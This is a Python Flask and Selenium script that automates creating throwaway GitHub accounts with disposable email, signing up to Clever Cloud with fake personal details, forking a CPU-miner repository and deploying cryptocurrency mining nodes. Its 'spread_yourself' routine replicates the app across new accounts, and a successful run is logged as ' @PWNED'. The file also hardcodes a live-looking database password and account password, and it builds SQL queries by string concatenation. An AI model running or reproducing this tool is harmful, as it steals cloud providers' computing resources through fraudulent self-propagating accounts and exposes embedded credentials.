import platform
import subprocess
from flask import Flask, Response, request
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
import time
from Crypto.PublicKey import RSA
import psycopg2
import logging

logger = logging.getLogger()
handler = logging.StreamHandler()
formatter = logging.Formatter(
        '%(asctime)s %(name)-12s %(levelname)-8s %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.INFO)

logger.info("Starting up flask app spready")

app = Flask(__name__)

GITHUB_PASSWORD = "C4mpR0b0t"
SELENIUM_HUB_HOST = "app-f2a9de49-1d97-4e82-908e-4e1d3ad22dab.cleverapps.io"
DB_NAME = "qrwvtvdu"

########################################################################################################################
# Utilities
########################################################################################################################
def screenshot(driver, fn):
    pass

class DriverWrapper(object):
    def __init__(self, uid, driver):
        self.uid = uid
        self.driver = driver

def create_browser():
    use_local = False
    uid = 0
    if use_local:
        driver = webdriver.Chrome()
    else:
        conn = get_connection()

        cur = conn.cursor()
        cur.execute("SELECT usages_, uid, username_, api_key_ FROM trompetto_selenium ORDER BY usages_ ASC LIMIT 1")
        rows = cur.fetchall()
        first_row = rows[0]

        current_usages = first_row[0]
        driver_uid = first_row[1]
        grid_username = first_row[2]
        grid_api_key = first_row[3]

        cur.close()
        conn.close()

        desired_cap = {
            'platform': "Mac OS X 10.9",
            'browserName': "chrome",
            'version': "31"
        }
        logger.info("Connecting to grid: " + grid_username)
        driver = webdriver.Remote(
            command_executor='http://'+grid_username+':'+grid_api_key+'@ondemand.saucelabs.com:80/wd/hub',
            desired_capabilities=desired_cap)
        uid = driver_uid

        conn = get_connection()
        cur = conn.cursor()
        cur.execute(
            "UPDATE trompetto_selenium SET usages_ = " + str((current_usages + 1)) + " WHERE uid = " + str(driver_uid))
        conn.commit()
        cur.close()
        conn.close()

        logger.info(" [^] Using Grid " + str(driver_uid) + "(" + grid_username + ").")

    driver.implicitly_wait(30)
    return driver

########################################################################################################################
# Disposable Mail
########################################################################################################################
class TempMailClient(object):
    HOME_URL = "https://mytemp.email/2/"
    def __init__(self):
        logger.info(" [*] Connecting to disposable mail site...")
        self.driver = create_browser()
        self.nav_home()
        email_input_element = self.driver.find_element_by_css_selector(".md-list-item-inner > span.truncate:nth-child(1)")
        self.mail_address = email_input_element.text
        logger.info(" [*] Temp Mail: " + self.mail_address)
        self.delete_all_mails()

    def delete_all_mails(self):
        logger.info(" [*] Delete all emails")
        for list_of_emails in self.driver.find_elements_by_css_selector("md-list.emls"):
            list_of_emails.find_element_by_css_selector(".eml-icon-status").click()

    def get_mail_list(self):
        return self.driver.find_element_by_css_selector("md-list.emls")

    def nav_home(self):
        self.driver.switch_to.default_content()
        self.driver.get(self.HOME_URL)

    def destroy(self):
        try:
            self.driver.quit()
        except:
            pass

########################################################################################################################
# Clever Cloud
########################################################################################################################
class CleverCloudManager(object):
    def restart(self):
        logger.info(" [$] Restarting Driver...")
        self.driver.quit()
        self.driver = create_browser()
        self.driver.get("http://api.clever-cloud.com/v2/github/signup")

    def __init__(self, mail_client, github):
        self.mail_client = mail_client
        self.github = github
        self.driver = create_browser()
        logger.info(" [*] Connecting to clever-cloud.com...")

    def signup(self):
        logger.info(" [*] Signing up...")
        self.driver.get("http://api.clever-cloud.com/v2/github/signup")
        self.driver.find_element_by_css_selector("input#login_field").send_keys(self.github.account)
        self.driver.find_element_by_css_selector("input#password").send_keys(GITHUB_PASSWORD)
        self.try_click(".btn-primary")
        logger.info(" [*] Authorizing application...")

        if not self.driver.title == "Console - Clever Cloud":
            self.try_click(".btn-primary")
            self.driver.get("https://api.clever-cloud.com/v2/session/signup")
            self.try_click(".btn-github")
            logger.info( " [*] Accepting terms & conditions.")
            self.try_click("input#legals")
            logger.info(" [*] Creating account.")
            self.try_click(".btn-signup")
            if self.driver.title == "Sign up · Clever Cloud":
                logger.info(" [XXX] Error - retrying...")
                self.driver.back()
                time.sleep(3)
                self.try_click("a.btn-github")
                logger.info(" [*] Accepting terms & conditions.")
                self.try_click("input#legals")
                time.sleep(2)
                logger.info(" [*] Accepted terms")
                self.try_click(".btn-finish-signup")
                logger.info(" [*] Loading PII form...")


        time.sleep(5)
        self.driver.refresh()
        time.sleep(30)

        try:
            logger.info (" [*] Filling out PII forms")
            screenshot(self.driver, "pii.png")

            self.driver.find_element_by_css_selector("input#user-name").send_keys("Trompetto")
            self.driver.find_element_by_css_selector("input#user-phone").send_keys("27827776543")
            self.driver.find_element_by_css_selector("input#user-address").send_keys("1 Infinite Loop")
            self.driver.find_element_by_css_selector("input#user-city").send_keys("Cupertino")
            self.driver.find_element_by_css_selector("input#user-zipcode").send_keys("12345")

            logger.info(" [*] Update PII")
            self.try_click("button.update")
            time.sleep(2)
        except:
            pass

        logger.info (" [9] Clever Cloud Signup complete")

    def create_selenium_hub(self):
        try:
            self.driver.quit()
        except:
            pass

        self.driver = create_browser()
        self.driver.get("https://console.clever-cloud.com/users/me/applications/new")
        self.driver.find_element_by_css_selector(".btn-github").click()
        self.driver.find_element_by_css_selector("input#login_field").send_keys(self.github.account)
        self.driver.find_element_by_css_selector("input#password").send_keys(GITHUB_PASSWORD)
        self.driver.find_element_by_css_selector(".btn-primary").click()

        time.sleep(5)
        logger.info(" [*] Creating a brand new selenium hub")
        self.driver.find_element_by_css_selector("span.dropdown-choice-value").click()
        time.sleep(1)
        self.driver.find_element_by_css_selector("div.input-search input").send_keys(Keys.ARROW_DOWN)
        time.sleep(1)
        self.driver.find_element_by_css_selector("div.input-search input").send_keys(Keys.ARROW_DOWN)

        self.driver.find_element_by_css_selector("div.input-search input").send_keys(Keys.ENTER)
        self.driver.find_element_by_css_selector('li[data-instance="docker"').click()
        self.driver.find_element_by_css_selector('.next').click()

        self.driver.find_element_by_css_selector('.btn-blue').click()
        logger.info(" [*] Skip selenium add-ons")
        self.driver.find_element_by_css_selector('.btn-blue').click()
        logger.info(" [*] Configure Environment")
        self.driver.find_element_by_css_selector(".btn.edit").click()
        self.driver.find_element_by_css_selector('tr[data-variable="PORT"').send_keys("4444")
        self.driver.find_element_by_css_selector(".btn.save").click()
        self.driver.find_element_by_css_selector(".btn.next").click()

        logger.info(" [*] Trying to find domain name")
        self.driver.find_element_by_css_selector("ul.settings li:nth-child(4)").click()
        self.grid_domain = self.driver.find_element_by_css_selector("ul.vhosts a").get_attribute("href")
        logger.info(" [*] Grid domain name:"+self.grid_domain)

    def refresh(self):
        self.driver.refresh()

    def destroy(self):
        try:
            self.driver.quit()
        except:
            pass

    def try_press_enter(self, selector):
        for ele in self.driver.find_elements_by_css_selector(selector):
            time.sleep(1)
            try:
                ele.click()
                logger.info("  - pressed enter " + selector)
                return True
            except:
                logger.info("  - can't find it yet.")
                pass
        return False

    def try_click(self, selector):
        for ele in self.driver.find_elements_by_css_selector(selector):
            time.sleep(1)
            try:
                ele.click()
                logger.info("  - clicked " + selector)
                return True
            except:
                logger.info("  - can't find it yet.")
                pass
        try:
            self.driver.execute_script("document.querySelector('"+selector+"').click();")
            return True
        except:
            return False

    def spread_yourself(self):
        self.driver.get("https://console.clever-cloud.com/users/me/applications/new")

        time.sleep(10)

        self.try_click("span.dropdown-choice-value")
        time.sleep(1)
        self.driver.find_element_by_css_selector("div.input-search input").send_keys(Keys.ARROW_DOWN)
        time.sleep(1)
        self.driver.find_element_by_css_selector("div.input-search input").send_keys(Keys.ARROW_DOWN)
        time.sleep(1)
        self.driver.find_element_by_css_selector("div.input-search input").send_keys(Keys.ENTER)
        self.try_click('li[data-instance="python"')
        logger.info (" [*] Scalability config...")
        time.sleep(5)
        self.driver.find_element_by_css_selector("body").click()
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").click()
        time.sleep(3)

        if not self.try_click("button.btn-blue.btn-right.next"):
            if not self.try_press_enter("button.btn-blue.btn-right.next"):
                if not self.try_click("button.next"):#105 from right and  #674 from top
                    win_size = self.driver.get_window_size()
                    body = self.driver.find_element_by_css_selector("body")
                    action = ActionChains(self.driver)
                    action.move_to_element_with_offset(body, win_size["width"] - 105, win_size["height"] + 674)
                    action.click()
                    action.perform()

        logger.info(" [*] Information config...")
        time.sleep(5)
        self.driver.find_element_by_css_selector("body").click()
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").click()
        time.sleep(3)

        if not self.try_click(".no-addon.btn.btn-blue.btn-large"):
            if not self.try_press_enter(".no-addon.btn.btn-blue.btn-large"):
                if not self.try_click("button.btn-blue"):
                    raise Exception("Couldn't press or click info config")

        time.sleep(5)
        logger.info(" [*] Ignore Add-ons")
        time.sleep(1)
        if not self.try_click("button.btn-blue"):
            raise Exception("Couldn't ignore add-ons")

        logger.info(" [*] Generating SSH Key")
        key = RSA.generate(2048)
        str_key = str(key.publickey().exportKey('OpenSSH').decode('ascii'))

        logger.info(" [*] Uploading SSH Key")
        time.sleep(1)
        for ele in self.driver.find_elements_by_css_selector(".key-name input"):
            time.sleep(1)
            try:
                ele.send_keys("My Key")
            except:
                pass
        for ele in self.driver.find_elements_by_css_selector(".key-value input"):
            time.sleep(1)
            ele.send_keys(str_key)
        self.try_click(".key-actions button")
        time.sleep(3)
        self.driver.find_element_by_css_selector("body").click()
        time.sleep(1)
        time.sleep(1)
        self.try_click("button.btn-blue")

        logger.info(" [*] Skipping env config")
        self.driver.find_element_by_css_selector("body").click()
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").click()
        time.sleep(1)
        screenshot(self.driver, "before-first-blue-env.png")
        logger.info ("   -> Next")

        if not self.try_click("button.btn.btn-blue.next"):
            if not self.try_press_enter("button.btn.btn-blue.next"):
                raise Exception("nope :(")

        time.sleep(2)
        screenshot(self.driver, "before-second-blue-env.png")

        if not self.try_click("button.next.btn.btn-blue.btn-large"):
            if not self.try_press_enter("button.next.btn.btn-blue.btn-large"):
                raise Exception("nope :(")

        screenshot(self.driver, "after-env.png")

    def create_mining_node(self):
        self.driver.get("https://console.clever-cloud.com/users/me/applications/new")

        time.sleep(10)

        self.try_click("span.dropdown-choice-value")
        time.sleep(1)
        self.driver.find_element_by_css_selector("div.input-search input").send_keys(Keys.ARROW_DOWN)
        self.driver.find_element_by_css_selector("div.input-search input").send_keys(Keys.ENTER)
        self.try_click('li[data-instance="node"')
        logger.info (" [*] Scalability config...")
        time.sleep(5)
        self.driver.find_element_by_css_selector("body").click()
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").click()
        time.sleep(3)

        if not self.try_click("button.btn-blue.btn-right.next"):
            if not self.try_press_enter("button.btn-blue.btn-right.next"):
                if not self.try_click("button.next"):#105 from right and  #674 from top
                    win_size = self.driver.get_window_size()
                    body = self.driver.find_element_by_css_selector("body")
                    action = ActionChains(self.driver)
                    action.move_to_element_with_offset(body, win_size["width"] - 105, win_size["height"] + 674)
                    action.click()
                    action.perform()

        logger.info(" [*] Information config...")
        time.sleep(5)
        self.driver.find_element_by_css_selector("body").click()
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").click()
        time.sleep(3)

        if not self.try_click(".no-addon.btn.btn-blue.btn-large"):
            if not self.try_press_enter(".no-addon.btn.btn-blue.btn-large"):
                if not self.try_click("button.btn-blue"):
                    raise Exception("Couldn't press or click info config")

        time.sleep(5)
        logger.info(" [*] Ignore Add-ons")
        time.sleep(1)
        if not self.try_click("button.btn-blue"):
            raise Exception("Couldn't ignore add-ons")

        logger.info(" [*] Generating SSH Key")
        key = RSA.generate(2048)
        str_key = str(key.publickey().exportKey('OpenSSH').decode('ascii'))

        logger.info(" [*] Uploading SSH Key")
        time.sleep(1)
        for ele in self.driver.find_elements_by_css_selector(".key-name input"):
            time.sleep(1)
            try:
                ele.send_keys("My Key")
            except:
                pass
        for ele in self.driver.find_elements_by_css_selector(".key-value input"):
            time.sleep(1)
            ele.send_keys(str_key)
        self.try_click(".key-actions button")
        time.sleep(3)
        self.driver.find_element_by_css_selector("body").click()
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").send_keys(Keys.TAB)
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").send_keys(Keys.TAB)
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").send_keys(Keys.TAB)
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").send_keys(Keys.TAB)
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").send_keys(Keys.TAB)
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").send_keys(Keys.TAB)
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").send_keys(Keys.ENTER)
        time.sleep(5)
        self.driver.find_element_by_css_selector("body").send_keys(Keys.ENTER)

        logger.info(" [*] Skipping env config")
        self.driver.find_element_by_css_selector("body").click()
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").send_keys(Keys.TAB)
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").send_keys(Keys.TAB)
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").send_keys(Keys.TAB)
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").send_keys(Keys.TAB)
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").click()
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").send_keys(Keys.TAB)
        time.sleep(1)
        self.driver.find_element_by_css_selector("body").send_keys(Keys.TAB)
        time.sleep(1)
        screenshot(self.driver, "before-first-blue-env.png")
        logger.info ("   -> Next")

        if not self.try_click("button.btn.btn-blue.next"):
            if not self.try_press_enter("button.btn.btn-blue.next"):
                raise Exception("nope :(")

        time.sleep(2)
        screenshot(self.driver, "before-second-blue-env.png")

        if not self.try_click("button.next.btn.btn-blue.btn-large"):
            if not self.try_press_enter("button.next.btn.btn-blue.btn-large"):
                raise Exception("nope :(")

        screenshot(self.driver, "after-env.png")


########################################################################################################################
# Github
########################################################################################################################
class GitHubAccountManager(object):
    def __init__(self, mail_client):
        logger.info(" [*] Connecting to github.com...")
        self.driver = create_browser()
        self.driver.get("https://www.github.com")
        self.mail_client = mail_client

    def sign_up(self):
        self.mail_client.driver.refresh()

        logger.info(" [*] Signup for a github account...")
        sign_up_button = self.driver.find_element_by_css_selector("div.site-header-actions > a.btn-primary")
        sign_up_button.click()

        form_group = self.driver.find_element_by_css_selector("form#signup-form")

        username = form_group.find_element_by_css_selector("#user_login")
        email_address = self.driver.find_element_by_css_selector("#user_email")
        password = self.driver.find_element_by_css_selector("#user_password")

        self.mail_client.driver.refresh()

        acc_name = self.mail_client.mail_address.split("@")[0] + "tpkunki"
        #HERE BRO

        self.mail_client.driver.refresh()
        username.send_keys(acc_name)
        email_address.send_keys(self.mail_client.mail_address)
        password.send_keys(GITHUB_PASSWORD)

        self.driver.find_element_by_css_selector("#signup_button").click()

        logger.info(" [*] Created account: " + acc_name)

        self.driver.find_element_by_css_selector(".js-choose-plan-submit").click()

        logger.info(" [*] Selected 'free' plan")
        self.mail_client.driver.refresh()

        self.driver.find_element_by_css_selector(".alternate-action").click()

        logger.info(" [*] Skipped developer survey.")

        time.sleep(3) #return with smart wait...

        logger.info(" [*] Verifying Github.com email...")
        mailbox = self.mail_client.get_mail_list()
        mailbox.find_element_by_css_selector(".md-list-item-inner").click()

        time.sleep(5)

        iframe = self.mail_client.driver.find_element_by_tag_name("iframe")
        self.mail_client.driver.switch_to.frame(iframe)

        verify_link = self.mail_client.driver.find_element_by_css_selector("a.cta-button").get_attribute("href")
        self.mail_client.driver.get(verify_link)

        time.sleep(5)

        self.mail_client.driver.find_element_by_css_selector("#login_field").send_keys(acc_name)
        self.mail_client.driver.find_element_by_css_selector("#password").send_keys(GITHUB_PASSWORD)
        self.mail_client.driver.find_element_by_css_selector(".btn-primary").click()

        self.mail_client.nav_home()

        self.account = acc_name

    def login(self):
        logger.info(" [*] Authenticating new github account...")
        self.driver.get("https://www.github.com")
        self.driver.find_element_by_css_selector("#login_field").send_keys(self.account)
        self.driver.find_element_by_css_selector("#password").send_keys(GITHUB_PASSWORD)
        self.driver.find_element_by_css_selector(".btn-primary").click()

    def fork_repo(self, repo_address):
        logger.info(" [*] Forking repo...")
        self.driver.get("https://github.com/" + repo_address)
        form = self.driver.find_element_by_css_selector("form.btn-with-count")
        form.find_element_by_tag_name("button").click()
        logger.info(" [*] Queued repo fork")

    def to_home(self):
        self.driver.get("https://www.github.com")

    def destroy(self):
        try:
            self.driver.quit()
        except:
            pass

########################################################################################################################
# Entry point
########################################################################################################################
def exploit(scale_up_factor):
    mail_client = TempMailClient()
    github_acc_manager = GitHubAccountManager(mail_client)
    ccloud = CleverCloudManager(mail_client, github_acc_manager)

    github_acc_manager.sign_up()
    github_acc_manager.to_home()

    time.sleep(5)

    ccloud.driver.refresh()

    github_acc_manager.fork_repo("trompetto/cpuminer-multi")

    ccloud.driver.refresh()

    github_acc_manager.fork_repo("trompetto/spready")

    ccloud.driver.refresh()

    while True:
        try:
            ccloud.signup()
            ccloud.create_mining_node()
            break
        except:
            logger.info("Failed... Retrying...")
            ccloud.restart()

    ccloud.driver.refresh()

    time.sleep(20)
    ccloud.driver.refresh()
    time.sleep(20)
    ccloud.driver.refresh()
    time.sleep(20)
    ccloud.driver.refresh()

    while True:
        try:
            for _ in range(0, scale_up_factor):
                logger.info("   >>> Spreading...")
                time.sleep(5)
                ccloud.driver.refresh()
                ccloud.spread_yourself()
            break
        except:
            logger.info("Failed spread... Retrying...")
            break


    mail_client.destroy()

    ccloud.refresh()

    conn = get_connection()
    cur = conn.cursor()
    cur.execute(
        "INSERT INTO trompetto_node_list (uid, name_) VALUES ((SELECT COUNT(1) + 1 FROM trompetto_node_list), '" + github_acc_manager.account + "')")
    conn.commit()
    logger.info (" @PWNED: " + github_acc_manager.account)
    cur.close()
    conn.close()

def get_connection():
    try:
        conn = psycopg2.connect(
            "dbname='qrwvtvdu' user='qrwvtvdu' host='elmer.db.elephantsql.com' password='phbDc2ttIVDvBpyS2Tkc1Oj3fB78PPnC'")
        return conn
    except:
        logger.info("Unexpected error connecting to DB.")

### Main App Entry Point
def entrypoint():
    conn = get_connection()

    cur = conn.cursor()
    cur.execute("SELECT max_nodes, wallet, pool_address, scale_up_factor FROM trompetto_cfg;")
    rows = cur.fetchall()
    first_row = rows[0]

    max_nodes = first_row[0]
    wallet_address = first_row[1]
    pool_address = first_row[2]
    scale_up_factor = first_row[3]

    cur = conn.cursor()
    cur.execute("SELECT COUNT(1) FROM trompetto_node_list;")
    rows = cur.fetchall()
    first_row = rows[0]
    number_of_live_nodes = first_row[0]

    logger.info("======== Configuration =========")
    logger.info("= Max Allowed Nodes:" + str(max_nodes))
    logger.info("= Wallet: " + wallet_address)
    logger.info("= Pool:" + pool_address)
    logger.info("= Current Grid Size: " + str(number_of_live_nodes))
    logger.info("= Scale Up Factor:" + str(scale_up_factor))
    logger.info("================================")

    if number_of_live_nodes >= max_nodes:
        logger.info("Not allowed to create any more nodes, max reached!")
        exit(0)

    cur.close()
    conn.close()

    exploit(scale_up_factor)

@app.route("/")
def running():
  entrypoint()
  return "Hello, World!"

@app.route("/pyver")
def pyver():
  return platform.python_version()

if __name__ == "__main__":
  logger.info("#Before app.run()")
  entrypoint()
  app.run()
  logger.info("##### After app.run()")
